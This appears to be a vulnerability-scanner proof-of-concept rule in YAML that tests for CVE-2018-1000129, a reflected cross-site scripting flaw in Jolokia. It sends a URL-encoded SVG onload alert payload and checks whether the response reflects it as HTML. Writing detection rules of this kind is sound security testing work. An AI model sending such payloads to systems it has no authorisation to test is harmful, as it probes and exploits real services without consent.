name: poc-yaml-jolokia-cve-2018-1000129-xss
set:
  r1: randomLowercase(6)
rules:
  - method: GET
    path: >-
      /jolokia/read%3csvg%20onload%3dalert%28{{r1}}%29%3e?mimeType=text/html
    headers:
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: false
    expression: response.body.bcontains(bytes("<svg onload=alert(" + r1 + ")>")) && response.body.bcontains(b"java.lang.IllegalArgumentException") && response.headers["content-type"].contains("text/html")
detail:
  author: mariobrow(https://github.com/amirnsahmad/)
  links:
    - https://www.cvedetails.com/cve/CVE-2018-1000129/
    - https://github.com/pyn3rd/Spring-Boot-Vulnerability
